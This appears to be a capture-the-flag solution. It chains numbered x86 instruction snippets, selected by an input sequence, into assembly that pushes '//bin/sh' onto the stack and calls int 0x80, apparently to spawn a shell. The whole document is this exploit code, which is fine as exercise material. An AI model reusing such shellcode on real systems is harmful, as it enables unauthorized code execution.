# 解答
```
0.	int 0x80 
	pop ebp 
	pop edi 
	pop esi 
	pop ebx
============================
1.	pop ebx 
	pop ebp 
	xor eax,eax
============================
2.	sub ecx,eax 
	pop ebp
============================
3.	mov edx,eax 
	pop ebx
============================
4.	pop ecx 
	pop eax
============================
5.	mov (esp),edx
============================
6.	pop edx 
	pop ecx 
	pop edx
============================
7.	add ecx,eax 
	pop ebx
============================
8.	add eax,0x2
============================
9.	push esp 
	push ebp
============================
10.	push 0x68732f6e 
	push 0x69622f2f
============================
11.	push 0x67616c66 
	push 0x2f2f6674 
	push 0x632f2f65 
	push 0x6d6f682f
============================
12.	push 1 
	push 2
============================
13.	push eax
============================
```
輸入 13,10,9,7,7,12,12,4,2,2,8,8,8,8,8,0
```
======Your code=====
global  _start
section .text
_start:
	push eax
	push 0x68732f6e
	push 0x69622f2f
	push esp
	push ebp
	add ecx,eax
	pop ebx
	add ecx,eax
	pop ebx
	push 1
	push 2
	push 1
	push 2
	pop ecx
	pop eax
	sub ecx,eax
	pop ebp
	sub ecx,eax
	pop ebp
	add eax,0x2
	add eax,0x2
	add eax,0x2
	add eax,0x2
	add eax,0x2
	int 0x80
	pop ebp
	pop edi
	pop esi
	pop ebx
====================
```